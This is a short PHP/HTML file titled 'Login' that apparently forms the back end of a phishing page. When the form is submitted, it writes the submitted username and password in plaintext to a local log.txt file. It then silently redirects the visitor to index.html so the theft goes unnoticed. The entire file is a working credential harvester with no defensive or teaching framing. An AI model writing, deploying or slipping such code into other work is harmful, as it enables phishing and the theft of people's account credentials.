<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php

//If Submit Button Is Clicked Do the Following
// hello world
if ($_POST['Login']){
$myFile = "log.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['uname'] . ":";
fwrite($fh, $stringData);
$stringData = $_POST['psw'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>



<script>location.href='index.html';</script>
	 
 </body>
</html>